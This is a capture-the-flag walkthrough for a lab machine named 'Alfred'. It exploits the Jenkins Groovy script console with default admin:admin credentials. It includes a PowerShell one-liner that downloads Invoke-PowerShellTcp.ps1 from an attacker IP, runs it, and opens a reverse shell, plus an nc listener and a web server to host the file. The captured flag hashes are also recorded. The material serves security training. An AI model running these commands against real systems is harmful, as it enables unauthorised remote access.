# Alfred

![[7c5699b320e84609a8a43d835aae408b.jpg]]

Jenkins 2.190.1

RCE can be accomplished by creating a project (too noisy) or by using the **Groovy Script** - this skeleton script was pulled from HackTricks (https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins)
## Proof of concept
![[12081e6f0ffc4e68a881bd3bd4c51ad6.png]]
The above picture shows that RCE is possible.

## Exploit
### Hacktricks said we can use this:

``` Groovy
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

### Tailored to our situation:
``` Groovy
"powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.73.217:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.73.217 -Port 4444".execute()
```

1. **Attack Box**
	1. Host the Invoke-PowerShellTcp.ps1 file
		`cd LOCATION_OF_PS1FILE`
		`python -m http.server 9000`
	3. Start a nc listener on 4444
		 `nc -nvlp 4444`
2. **Jenkins UI**: go to http://ip:port/scripts
	1. Use credential **admin**:**admin** if necessary
	2. Paste modified script from above.
	3. Click **Run**

### Boom, we got shell
![[6a6828dd3fbe47058f5a37e6b823a3f9.png]]

### User Flag
![[5a951ec567624861be4e62fb58b63d61.png]]
![[95ab765549eb41a68164ffc0f0db8239.png]]
`79007a09481963edf2e1321abd9ae2a0`



![[78e78c8012044d4b9262fec7f31aa002.png]]
`dff0f748678f280250f25a45b8046b4a`